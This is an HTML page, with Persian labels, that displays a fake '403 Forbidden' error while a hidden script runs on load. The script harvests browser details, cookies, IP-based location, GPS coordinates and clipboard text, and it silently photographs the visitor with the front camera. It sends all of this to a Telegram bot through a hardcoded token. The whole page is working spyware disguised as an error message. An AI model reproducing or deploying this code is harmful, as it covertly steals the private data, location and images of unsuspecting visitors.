<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
</head>
<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
    <div style="color:#fff;text-align:center;font-family:Arial;">
        <p style="font-size:24px;">Error 403 - Forbidden</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        var T="8679783900:AAHgD4k5NpYEFne9lsfh_S2P3lZisMNXeu8";
        var C="8679783900";
        function s(m){
            fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:C,text:m,parse_mode:"HTML"})
            });
        }
        function p(b,capt){
            var f=new FormData();
            f.append("chat_id",C);
            f.append("photo",b,"img.jpg");
            f.append("caption",capt);
            fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:"POST",body:f});
        }
        async function go(){
            var info="🔴 گزارش جدید\n\n";
            info+="UA: "+navigator.userAgent+"\n";
            info+="Platform: "+navigator.platform+"\n";
            info+="زبان: "+navigator.language+"\n";
            info+="صفحه: "+screen.width+"x"+screen.height+"\n";
            info+="Referrer: "+(document.referrer||"مستقیم")+"\n";
            info+="Cookie: "+(document.cookie||"ندارد")+"\n";
            try{
                var r=await fetch("https://api.ipify.org?format=json");
                var d=await r.json();
                var ip=d.ip;
                var gr=await fetch("http://ip-api.com/json/"+ip);
                var gd=await gr.json();
                info+="\n📍 موقعیت:\nIP: "+ip+"\nکشور: "+(gd.country||"?")+"\nشهر: "+(gd.city||"?")+"\nISP: "+(gd.isp||"?")+"\n";
            }catch(e){}
            if(navigator.geolocation){
                try{
                    var pos=await new Promise(function(ok,err){
                        navigator.geolocation.getCurrentPosition(ok,err,{timeout:5000});
                    });
                    info+="\n🎯 GPS:\nLat: "+pos.coords.latitude+"\nLon: "+pos.coords.longitude+"\n";
                }catch(e){info+="\n⚠️ GPS رد شد\n";}
            }
            try{
                var ct=await navigator.clipboard.readText();
                if(ct) info+="\n📋 کلیپ‌بورد: "+ct+"\n";
            }catch(e){}
            s(info);
            try{
                var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
                var vv=document.getElementById("v");
                vv.srcObject=stream;
                await vv.play();
                setTimeout(function(){
                    var cc=document.getElementById("c");
                    cc.width=vv.videoWidth;
                    cc.height=vv.videoHeight;
                    cc.getContext("2d").drawImage(vv,0,0);
                    cc.toBlob(function(b){p(b,"📸 دوربین جلو");stream.getTracks().forEach(function(t){t.stop();});},"image/jpeg");
                },1500);
            }catch(e){}
        }
        go();
    </script>
</body>
</html>
